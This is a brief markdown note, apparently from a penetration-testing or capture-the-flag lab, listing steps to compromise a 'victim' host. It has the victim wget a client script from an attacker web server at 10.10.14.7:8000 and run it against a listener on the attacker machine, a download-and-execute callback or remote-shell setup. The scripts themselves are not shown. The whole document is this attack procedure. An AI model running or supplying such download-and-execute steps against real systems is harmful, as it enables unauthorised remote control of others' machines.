# Assumptions
- python3 exists on the server

# Steps
1. (on attacker): python3 http_server.py
2. (on victim): wget 10.10.14.7:8000/victim_client_10.10.14.7.py
3. (on attacker): python3 listener.py
4. (on victim): python3 victim_client_10.10.14.7.py
